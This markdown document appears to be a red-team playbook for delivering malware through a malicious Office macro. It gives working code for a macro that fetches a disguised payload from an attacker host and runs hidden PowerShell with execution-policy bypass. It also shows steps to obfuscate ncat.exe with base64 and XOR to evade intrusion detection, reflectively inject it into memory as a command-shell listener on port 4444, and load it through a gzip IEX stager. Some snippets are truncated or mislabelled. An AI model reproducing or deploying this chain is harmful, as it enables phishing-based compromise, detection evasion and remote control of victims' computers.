# Use Case 3: Download and Execute

**Office doc and Macro development**

Embed the following malicious macro into an office doc:

```vbscript
Sub DownloadAndExec()
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
    
'Replace attacker.domain/ps1_b64 with real-world domain and location 
xHttp.Open "GET", "https://attacker.domain/ps1_b64.crt", False

xHttp.Send
With bStrm
 .Type = 1 '//binary
 .Open
 .write xHttp.responseBody
 .savetofile "encoded_ps1.crt", 2 '//overwrite
End With
Shell ("cmd /c certutil -decode encoded_ps1.crt decoded.ps1 &
c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -ep bypass -W
Hidden .\decoded.ps1")
End Sub
```

The above macro will go out to **attacker.domain** and fetch **ps1_b64.crt** (*this should be a base64 encoded payload saved as a certificate file [.cer or.crt]*).

**IDS Evasive Payload**

1. Transform **ncate.exe** to base64 string.  Paste the below PS script into PS ISE and then run `Convert-BinaryToString` against the **full-path name** of **ncat.exe**.

```powershell
function Convert-BinaryToString {
 [CmdletBinding()] param (
 [string] $FilePath
 )
 try {
 $ByteArray = [System.IO.File]::ReadAllBytes($FilePath);
 }
 catch {
 throw "Failed to read file.";
 }
 if ($ByteArray) {
 $Base64String = [System.Convert]::ToBase64String($ByteArray);
 }
```

```powershell
Convert-BinaryToString full_path_to_ncat_executable
```

2. Create key to XOR-obfuscate the Base64-converted ncat.exe.  

*In bash*

```bash
cat encoded-ncat |sed -e 's/A/M/g' > xorKey-encoded-ncat
```
*In PowerShell*

```powershell
cat .\encoded-calc.txt |%{$_ -replace"A","M"} > xorKey-encoded-cal
```

3. XOR the Base64-converted ncat.exe

   - Run the following PS script in a PS window.  (It asks for output file name).  In the case of this example out-file = **xor_obfuscated_calc**

```powershell
powershell -ep bypass ..\scripts\powershell-XOR.ps1 .\encoded-calc.txt .\xorKey-encoded-cal
```

4. Utilize modified Invoke Reflective PE Injection script [here](https://gist.github.com/anonymous/01ff63395cc8b3a8a6dad3402d3bf8b9), being sure to add (to the end) and update the following lines with the correct attack server.
   - GZIP compress the full script with the [compress tool](http://www.txtwizard.net/compression)

```powershell
#Drop the XORed Ncat from step 3 and the XOR key from Step 2 to Temp
(new-object Net.WebClient).DownloadFile('http://attacker.domain/xored_ncat' ,
$env:temp+"/ciphertext")
(new-object Net.WebClient).DownloadFile('http://attacker.domain/xor_key' ,
$env:temp+"/key")
$ciphertext = [System.IO.File]::ReadAllBytes($env:temp+"/ciphertext")
$key = [System.IO.File]::ReadAllBytes($env:temp+"/key")
$len = if ($ciphertext.Count -lt $key.Count) {$ciphertext.Count} else {
$key.Count}
$xord_byte_array = New-Object Byte[] $len
#XOR between the XORed Ncat and the XOR key
for($i=0; $i -lt $len ; $i++) {
$xord_byte_array[$i] = $ciphertext[$i] -bxor $key[$i] }
#The deciphered Ncat is stored on Temp
[System.IO.File]::WriteAllBytes($env:temp+"/deciphered", $xord_byte_array)
$deciphered = Get-Content $env:temp/deciphered
$PEBytes = [System.Convert]::FromBase64String($deciphered)
#De-obfuscated Ncat is reflectively loaded into memory
Invoke-PEInjectionInMemory -PEBytes $PEBytes -ExeArgs "-nlvp 4444 -e cmd"
```


5. Embed GZIP compressed fully moded PE file (step 4) into the below PS script and save as a gzip-memorystream.ps1.

```powershell
$s=New-Object
IO.MemoryStream(,[Convert]::FromBase64String('insert_gzip_compressed_InvokeReflectivePEInjection'));
IEX (New-Object IO.StreamReader(New-Object
IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).
ReadToEnd()
```

6. Base64 Encode **gzip-memorystream.ps1** (step 5) and save as a **.crt** (CRT) file.  Host this file on the attack server.  Use the same method of encoding as Step 1.
